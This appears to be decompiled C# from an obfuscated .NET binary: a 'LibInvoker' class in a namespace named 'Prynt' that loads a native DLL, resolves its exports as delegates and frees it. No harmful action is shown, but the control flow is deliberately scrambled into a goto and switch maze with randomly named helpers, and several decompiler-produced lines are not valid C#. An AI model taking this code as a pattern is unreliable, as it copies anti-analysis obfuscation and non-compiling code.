using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using jfPEfaprJECxIKybwO;

namespace Prynt;

public sealed class LibInvoker : IDisposable
{
	private IntPtr AU3J3TmZB;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public LibInvoker(string fileName)
	{
		//Discarded unreachable code: IL_0002, IL_0006, IL_0095
		//IL_0003: Incompatible stack heights: 0 vs 1
		//IL_0007: Incompatible stack heights: 0 vs 1
		_ = 1;
		int num;
		if (!LDTUw1rU9ErAt1H9xT())
		{
			num = 6;
			if (false)
			{
				goto IL_0020;
			}
		}
		else
		{
			num = 2;
		}
		goto IL_00a2;
		IL_005a:
		hb4mCJnKTIwpeC12U0(this);
		num = 4;
		if (LDTUw1rU9ErAt1H9xT())
		{
			goto IL_0070;
		}
		goto IL_00a2;
		IL_0020:
		kgWyYeLLuLvV3X2BvG();
		goto IL_005a;
		IL_00a2:
		while (true)
		{
			switch (num)
			{
			case 0:
			case 6:
				break;
			case 5:
				if (oEwY7x1p2EglallsUq(AU3J3TmZB, IntPtr.Zero))
				{
					num = 3;
					if (OK9bMm9dodD65ZOPRF())
					{
						continue;
					}
					goto IL_005a;
				}
				return;
			case 1:
			case 2:
				goto IL_005a;
			case 3:
				goto IL_0070;
			case 4:
				AU3J3TmZB = NativeMethods.LoadLibrary(fileName);
				goto case 5;
			default:
				num = 5;
				if (true)
				{
					continue;
				}
				return;
			case 7:
				return;
			}
			break;
		}
		goto IL_0020;
		IL_0070:
		NqL0mozbOZnEY7fduc(pohjmG8Q0H3Z85By0j());
		num = 7;
		goto IL_00a2;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public TDelegate CastToDelegate<TDelegate>(string MicrosoftWinTimerElapsedEventHandlerKtionName) where TDelegate : class
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		IntPtr procAddress = NativeMethods.GetProcAddress(AU3J3TmZB, MicrosoftWinTimerElapsedEventHandlerKtionName);
		if (procAddress == IntPtr.Zero)
		{
			return null;
		}
		return Marshal.GetDelegateForFunctionPointer(procAddress, typeof(TDelegate)) as TDelegate;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Dispose()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		if (rdNZ2Dcip7GtcRx4F1V(AU3J3TmZB, IntPtr.Zero))
		{
			NativeMethods.FreeLibrary(AU3J3TmZB);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void kgWyYeLLuLvV3X2BvG()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		bU1FJSlOuQklahmsOY.xWjn6pazmLWZg();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void hb4mCJnKTIwpeC12U0(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		P_0._002Ector();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool oEwY7x1p2EglallsUq(IntPtr P_0, IntPtr P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return P_0 == P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int pohjmG8Q0H3Z85By0j()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Marshal.GetHRForLastWin32Error();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void NqL0mozbOZnEY7fduc(int P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		Marshal.ThrowExceptionForHR(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool OK9bMm9dodD65ZOPRF()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool LDTUw1rU9ErAt1H9xT()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool rdNZ2Dcip7GtcRx4F1V(IntPtr P_0, IntPtr P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return P_0 != P_1;
	}
}
